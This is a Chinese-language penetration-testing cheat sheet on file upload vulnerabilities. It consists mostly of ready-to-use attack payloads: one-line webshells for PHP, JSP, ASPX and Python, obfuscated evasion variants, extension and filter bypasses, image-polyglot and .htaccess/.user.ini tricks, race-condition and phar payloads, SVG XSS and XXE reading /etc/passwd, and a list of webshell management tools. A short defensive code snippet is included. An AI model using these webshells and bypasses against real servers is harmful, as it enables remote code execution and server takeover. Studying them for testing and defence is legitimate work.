# 文件上传漏洞

## 原理

Web 应用允许用户上传文件，但未对文件类型、内容、路径做充分校验，导致攻击者可上传 Webshell、恶意脚本，获取服务器控制权。

## 攻击链

### 1. 探测上传点

- 头像上传、附件上传、图片上传
- 文件导入、批量上传
- 编辑器上传（CKEditor、TinyMCE、UEditor）
- 通过抓包分析上传请求

### 2. 基础 Webshell

```php
# PHP 一句话
<?php @eval($_POST['cmd']);?>
<?php @system($_GET['cmd']);?>
<?php echo shell_exec($_GET['cmd']);?>
<?php `$_GET[cmd]`;?>
<?php passthru($_GET['cmd']);?>
<?php exec($_GET['cmd']);?>
<?php pclose(popen($_GET['cmd'],'r'));?>

# 免杀一句话
<?php $a=str_replace('x','','axsxxsxxexrxt');$a($_POST['cmd']);?>
<?php $a='sys'.'tem';$a($_POST['cmd']);?>
<?php $a=base64_decode('c3lzdGVt');$a($_POST['cmd']);?>
<?php $_POST['cmd']($_POST['a']);?>  # POST: cmd=system&a=id

# JSP
<%
  if("023".equals(request.getParameter("pwd"))){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    while((a=in.read(b))!=-1){ out.println(new String(b)); }
  }
%>

# ASPX
<%@ Page Language="C#" %>
<%
  if(Request["cmd"]!=null){
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
  }
%>

# Python (Flask/Django)
import os
os.popen(request.POST['cmd']).read()
```

## 绕过技巧

### 1. 前端校验绕过

```javascript
// 直接 Burp 改包，绕过 JS 校验
// 删除 onsubmit 事件
// 修改 Content-Type
```

### 2. Content-Type 绕过

```http
# 修改 Content-Type
Content-Type: image/jpeg  // 实际是 PHP 文件
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

### 3. 文件扩展名绕过

```http
# PHP 备用扩展名
.php .php3 .php4 .php5 .php7 .pht .phtml .phar .pgif .shtml
.inc .htaccess .user.ini

# ASP/ASPX
.asp .aspx .asa .cer .ashx .asmx .aspx

# JSP
.jsp .jspx .jspf .jsw .jsv .jtml

# Apache 解析漏洞
shell.php.jpg    # Apache 从右往左解析，遇到不认识的扩展名继续往左
shell.php.abc    # .abc 不认识，解析为 .php

# IIS 解析漏洞
shell.asp;.jpg    # IIS 6.0 截断
shell.asp/xxx.jpg  # IIS 6.0 目录解析
shell.aspx::$DATA  # Windows NTFS ADS

# Nginx 解析漏洞
shell.jpg/x.php   # Nginx + PHP-CGI 配置错误时
shell.jpg%00.php   # 空字节截断
```

### 4. 文件头绕过

```python
# 添加图片文件头
GIF89a  # GIF
<?php @eval($_POST['cmd']);?>

# 写入图片
# GIF
GIF89a
<?php @eval($_POST['cmd']);?>

# JPEG (FFD8FF)
\xFF\xD8\xFF\xE0\x00\x10JFIF...
<?php @eval($_POST['cmd']);?>

# PNG (89504E47)
\x89PNG\r\n\x1a\n...
<?php @eval($_POST['cmd']);?>

# 制作图片马
copy /b normal.jpg + shell.php shell.jpg   # Windows
cat normal.jpg shell.php > shell.jpg        # Linux
```

### 5. .htaccess 绕过

```apache
# 上传 .htaccess 让特定文件被当作 PHP 解析
AddType application/x-httpd-php .jpg

# 或
<FilesMatch "shell">
  SetHandler application/x-httpd-php
</FilesMatch>

# 或
AddHandler application/x-httpd-php .jpg
```

### 6. .user.ini 绕过（PHP）

```ini
# 上传 .user.ini 到目录
# PHP 会自动加载该目录下的 .user.ini
auto_prepend_file = shell.jpg
# 然后访问该目录下任意 .php 文件，会先执行 shell.jpg
```

### 7. 文件名绕过

```http
# 大小写
shell.PHP
shell.PhP

# 双写
shell.pphphp

# 空格
shell.php(空格)
shell.php%20

# 点
shell.php.

# ::$DATA (Windows)
shell.php::$DATA

# 空字节
shell.php%00.jpg
shell.php\x00.jpg

# 特殊字符
shell.pHp
shell.php5
shell.phtml
```

### 8. 文件内容绕过

```php
# 过滤 <?php
<script language="php">eval($_POST['cmd']);</script>
<?=eval($_POST['cmd']);?>
<? eval($_POST['cmd']);?>
<? `$_GET[cmd]`;?>

# 过滤 eval
assert($_POST['cmd']);
create_function('',$_POST['cmd'])();
call_user_func('assert',$_POST['cmd']);
preg_replace('/test/e',$_POST['cmd'],'test');  # PHP 7.0 以下

# 过滤 system
`$_POST[cmd]`  # 反引号
shell_exec($_POST['cmd']);
passthru($_POST['cmd']);
exec($_POST['cmd']);
popen($_POST['cmd'],'r');
```

### 9. 二次渲染绕过

```python
# GIF
# 找渲染前后不变的区块，插入 payload

# PNG
# 利用 PLTE 块或 IDAT 块
# 工具：https://github.com/hx19740/PNG-Payload-Generator

# JPEG
# 利用 EXIF 注入
exiftool -Comment='<?php @eval($_POST["cmd"]);?>' shell.jpg
```

### 10. 竞争条件绕过

```python
# 服务器先保存文件，再检查删除
# 利用时间窗口访问

# 上传 shell.php
# 内容：
<?php file_put_contents('shell2.php','<?php @eval($_POST["cmd"]);?>');?>
# 然后并发访问 shell.php，触发写入 shell2.php
```

### 11. ZIP/PHAR 绕过

```php
# 上传 phar 文件
# phar 文件本质是 PHP 归档
# 内容：
<?php
$p = new Phar('shell.phar');
$p['shell.php'] = '<?php @eval($_POST["cmd"]);?>';
$p->setStub('<?php __HALT_COMPILER();');
# 然后通过 phar:// 协议触发

# 利用 phar 反序列化
phar://shell.phar
```

### 12. 扩展名判定不一致绕过（首点 vs 末点 / 过滤-解析分歧）

**触发条件**：服务端（Apache+PHP）只把精确 `.php` 当 PHP 解析，WAF 用扩展名黑名单拦截；
且所有备用扩展名（`.phtml/.phps/.inc` 等）实测都不执行、`.htaccess` 被拦、`.user.ini` 无同级
`.php` 触发 —— 即"能传的不执行，能执行的被拦"的死局时，优先怀疑 **WAF 与解析器对
"扩展名从哪个点开始"的判定基准不一致**。

**原理**（WAF 提取逻辑为反推/常见实现假设，非源码确认）：
- WAF 常见写法：`substr($name, strpos($name,'.')+1)` 或 `explode('.', $name)[1]` —— 取**第一个**点之后的串。
- 解析器（Apache `FilesMatch "\.php$"` / PHP `PATHINFO_EXTENSION`）—— 只看**最后一个**点之后的串。
- 当文件名开头出现连续点（如 `..php`），两者切出的"扩展名"不同：
  - WAF 取首点之后 → `.php`（带前导点）→ 与黑名单纯名 `php` 比对 → 不匹配 → **放行**
  - 解析器取末点之后 → `php` → **按 PHP 解析执行**
- 结果：文件被 WAF 放行，却被解析器执行 → RCE。

**载荷**：
```
name=..php        # 首点分隔，最典型
name=...php       # 多变体，原理相同
name=.shell.php   # 首字符为点，首点切出 .shell.php，末点切出 php
```
> 注：`.php`（单点开头、无名字部分）通常**不绕过**，因部分实现下 `pathinfo('.php')` 的 EXTENSION 为空；
> 关键是"首点 ≠ 末点"，即文件名里至少两个点时，名字部分与扩展名分隔所用的点不是同一个。

**验证（防假阳性，必做）**：
上传后必须确认 PHP **真的执行**，而非"文件传上去了"：
- 用运行时才计算、源码里不存在的标记，例如 `<?php echo "X".(7*6)."Y"; ?>` —— 仅执行才输出 `X42Y`。
- 严禁用写死的串（如 `<?php echo "EXEC";?>` 后 grep "EXEC"）验证，会误判为已执行。
- `curl -i` 看 `Content-Type`：真执行为 `text/html` 且含 `X42Y`；静态返回 `text/plain` 即未执行。

**防御（正确写法）**：
```php
$name = basename($_FILES['file']['name']);                    // 先剥路径
$ext  = strtolower(pathinfo($name, PATHINFO_EXTENSION));     // 取末点扩展名并小写归一
$ext  = trim($ext, ". \t\n\r\0\x0B");                        // 去首尾点/空白
if (in_array($ext, ['php','php3','php4','php5','php7','pht','phtml','htaccess'], true)) die("blocked");
```
核心：过滤与解析必须用**同一套**取扩展名逻辑（统一 `pathinfo`/末点 + 小写归一 + 去首尾点），消除首点/末点分歧。

## 2024-2026 新技术点

### 1. PHP 8.x 新特性

```php
# PHP 8.0+ 移除了 create_function, preg_replace /e
# 但新增了：
# 命名参数
system(command: $_POST['cmd']);

# Match 表达式
match(true){1=>system($_POST['cmd'])};

# Fiber
$f = new Fiber(function(){system($_POST['cmd']);});
$f->start();
```

### 2. 现代框架上传漏洞

```python
# Django
# settings.py 中 FILE_UPLOAD_HANDLERS
# 临时文件处理可能存在竞态

# Flask
# werkzeug.utils.secure_filename 可能被绕过

# Express (multer)
# 文件名处理差异
```

### 3. 云存储上传漏洞

```http
# AWS S3 预签名 URL
# 如果签名允许任意 Content-Type，可上传任意文件

# 阿里云 OSS
# 通过 STS token 上传任意文件
```

### 4. WebP/AVIF 新格式

```python
# 新图片格式可能绕过文件头检测
# 但 PHP 仍能解析其中的 payload
```

### 5. 容器环境上传

```python
# Kubernetes ConfigMap 挂载
# 通过上传文件覆盖挂载点
```

### 6. CDN 缓存投毒

```http
# 上传恶意文件到 CDN
# 通过缓存键操纵让其他用户访问到恶意内容
```

### 7. SVG 上传

```xml
# SVG 文件可包含 JS，导致 XSS
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <script type="text/ecmascript">
    alert(document.cookie)
  </script>
</svg>

# SVG + XXE
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### 8. PDF 上传

```python
# PDF 文件可包含 JS
# 通过 PDF.js 漏洞触发 RCE
# CVE-2024-4367 (PDF.js)
```

### 9. Office 文件上传

```python
# DOCX/XLSX 本质是 ZIP
# 可包含宏（.docm/.xlsm）
# 可包含 OLE 对象
# 可触发 XXE
```

## 工具推荐

- **AntSword** — 中国蚁剑（Webshell 管理）
- **CKnife** — 中国菜刀
- **Behinder** — 冰蝎（加密流量）
- **Godzilla** — 哥斯拉（加密流量）
- **weevely** — Python Webshell 生成器
- **b374k** — PHP Webshell

## 参考链接

- [PayloadsAllTheThings - Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [OWASP File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
